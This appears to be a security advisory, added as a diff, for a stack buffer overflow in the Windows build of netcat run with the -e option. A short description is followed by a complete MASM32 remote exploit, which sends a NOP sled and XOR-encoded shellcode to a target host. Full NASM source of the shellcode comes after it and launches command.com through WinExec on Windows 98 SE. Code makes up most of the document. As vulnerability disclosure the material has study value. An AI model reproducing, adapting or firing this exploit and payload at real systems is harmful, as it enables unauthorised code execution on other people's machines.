@@ -1,0 +1,225 @@
+Abstract: 
+ NetCat (nc.exe) is vulnerable to a buffer overflow. The vulnerability
+is known to affect only nc.exe for Microsoft Windows Platforms allowing
+remote code execution.
+ 
+Description: 
+ When netcat is run with the -e option (bind a program to be executed on
+connect) insufficiant bounds checking on the piped users input leads to
+a stack-based buffer overflow allowing remote code execution.
+
+Analysis:  
+ The buffer overflow condition occurs when a malicious user sends 300 
+bytes to nc.exe invoked with the -e option. The retaddr is overwritten
+at bytes 237-240. This is due to insufficiant boundary checking on the
+piped user input. At first it appears that only 60 Bytes is available
+for the payload, but not all data before the return address is munged,
+allowing us to implement a payload much earlier in the stack overflow.
+
+ An exploit is attached which demonstrates this attack by redirecting
+netcat into a command prompt on the attacked system. This has been tested 
+under Microsoft Windows 98 SE. If netcat is not running in a Console window
+(-d) a new console window is created. For details of the payload, please
+see the attached shellcode.
+
+Detection:
+ nc.exe is known to be vulnerable.
+
+Workaround: 
+ N/A, no vendor supplied fix is available, it is recommended that netcat
+is not used with the -e option to provide networked services.
+
+---------------------------------[EXPLOIT BEGIN]---------------------------------------
+;#   Tested on: NetCat (nc.exe) under Windows 98 SE
+;# Description: Boundary Checking Error 
+;#      Bug ID: 9
+;# Description: When netcat is run with the -e option (bind a program
+;#              to be executed on connect) insufficient bounds checking
+;#              on the users input leads to a buffer overflow.
+;#
+;#              The shellcode in this exploit creates a local command
+;#              prompt on the exploited box, assuming a kernel base of
+;#              0xBFF70000 (Win98 SE).
+;#
+;#              Compile with MASM32.
+;#
+.386
+.model flat,stdcall
+option casemap: none
+
+include \masm32\include\windows.inc
+include \masm32\include\masm32.inc
+include \masm32\include\kernel32.inc
+include \masm32\include\wsock32.inc
+includelib \masm32\lib\masm32.lib
+includelib \masm32\lib\kernel32.lib
+includelib \masm32\lib\wsock32.lib
+
+.data
+    info db "[nc.exe -e] Remote Buffer Overflow!",13,10,13,10
+         db "Please input a host in I.P Format (e.g 127.0.0.1) to attack!",13,10
+         db "[Target:] ",0
+    host db 120 dup(?)
+    port dd 81            ;# Adjust this to the port of the remote service.
+  xploit db 166 dup(090h)
+         db 0EBh, 00Eh, 058h, 080h, 030h, 099h, 040h, 066h, 081h, 038h
+         db 069h, 064h, 075h, 0F5h, 0EBh, 005h, 0E8h, 0EDh, 0FFh, 0FFh
+         db 0FFh, 070h, 081h, 099h, 099h, 099h, 0C7h, 0F1h, 09Ch, 099h
+         db 099h, 099h, 0CFh, 023h, 031h, 094h, 063h, 026h, 066h, 04Bh
+         db 0A8h, 04Bh, 0CBh, 023h, 061h, 04Dh, 061h, 026h, 066h, 04Bh
+         db 071h, 07Ah, 066h, 066h, 066h, 0FAh, 0F6h, 0F4h, 0F4h, 0F8h
+         db 0F7h, 0FDh, 0B7h, 0FAh, 0F6h, 0F4h, 099h, 069h, 064h, 090h
+         db 0F3h, 0FEh, 07Bh, 001h 
+         db 60 dup(090h),13,10,0
+    sock dd ?
+
+xploitlen equ $-xploit
+
+wsadescription equ 256
+wsasystatus equ 128
+
+WSAData struct
+wVersion     dw ?
+wHighVersion dw ?
+szDescritpion  equ wsadescription+1 dup(?)
+szSystemStatus equ wsasystatus+1    dup(?)
+iMaxSockets  dw ?
+iMaxUdpDg    dw ?
+lpVendorInfo dw ?
+WSAData ends
+wsadata WSAData <?>
+
+sin_sockaddr_in struct
+sin_family dw ?
+  sin_port dw ?
+  sin_addr dd ? 
+  sin_zero db 8 dup(0)
+sin_sockaddr_in ends 
+sin sin_sockaddr_in <?>
+
+.code
+start:
+      call config_via_console
+      call config_winsock
+      call connect_winsock
+      call xploit_host
+      call exit_program
+
+config_via_console:
+      pop esi
+      call AllocConsole
+      push offset info
+      call StdOut
+      push sizeof host
+      push offset host
+      call StdIn
+      push esi
+      ret
+      
+config_winsock:
+      pop esi
+      push offset wsadata
+      mov eax,0101h
+      push eax
+      call WSAStartup
+      xor eax,eax 
+      push eax
+      inc eax
+      push eax
+      inc eax
+      push eax
+      call socket
+      mov sock,eax
+      push esi
+      ret
+
+connect_winsock:
+      pop esi
+      mov sin.sin_family,2
+      push port
+      call htons
+      mov sin.sin_port,ax
+      xor eax,eax
+      push offset host
+      call inet_addr
+      mov sin.sin_addr,eax      
+      push sizeof sin
+      push offset sin
+      push sock
+      call connect
+      .if eax > 0EFFFFFFFh
+          call exit_program
+      .endif
+      push esi
+      ret
+
+xploit_host:      
+      pop esi
+      xor eax,eax
+      push eax
+      push xploitlen
+      push offset xploit
+      push sock
+      call send
+      push esi
+      ret
+      
+exit_program:
+      push sock      
+      call closesocket
+      call WSACleanup
+      xor eax,eax
+      push eax      
+      call ExitProcess
+end start
+----------------------------------[EXPLOIT END]----------------------------------------
+--------------------------------[SHELLCODE BEGIN]--------------------------------------
+;# Description: Win 98 SE Local Shellcode
+;#      Result: Executes a command prompt
+;# Kernel base: 0xBFF70000
+;#
+;# This is a complete local shellcode. This shellcode creates a command
+;# prompt via the WinExec function.
+;#
+;# Compile with NASM.
+;#
+BITS 32
+ORG 0x0
+  jmp short get_code
+decrypt_start:                      	
+  pop eax                   	
+decrypt:                    	
+  xor byte [eax], 0x99
+  inc eax                   	
+  cmp word [eax], 'id'   	
+  jne short decrypt             
+  jmp short encrypted_code
+get_code:                        	
+  call decrypt_start                	
+encrypted_code:  
+  db 070h, 081h, 099h, 099h, 099h, 0C7h, 0F1h, 09Ch, 099h, 099h, 099h, 0CFh
+  db 023h, 031h, 094h, 063h, 026h, 066h, 04Bh, 0A8h, 04Bh, 0CBh, 023h, 061h
+  db 04Dh, 061h, 026h, 066h, 04Bh, 071h, 07Ah, 066h, 066h, 066h, 0FAh, 0F6h
+  db 0F4h, 0F4h, 0F8h, 0F7h, 0FDh, 0B7h, 0FAh, 0F6h, 0F4h, 099h
+end_code:
+  db 'id'
+  nop          
+
+;#; The encrypted_code source
+;#; This is compiled as a binary and each byte is XOR'd with 0x99.
+;#
+;#   jmp data
+;#egg:
+;#   pop esi
+;#   push 5
+;#   push esi
+;#   mov edx,0BFFA0DA8h
+;#   call edx
+;#   xor edx,edx
+;#   push edx
+;#   mov edx,0BFF8D4F8h
+;#   call edx
+;#data:
+;#   call egg
+;#   db "command.com",0
+---------------------------------[SHELLCODE END]---------------------------------------
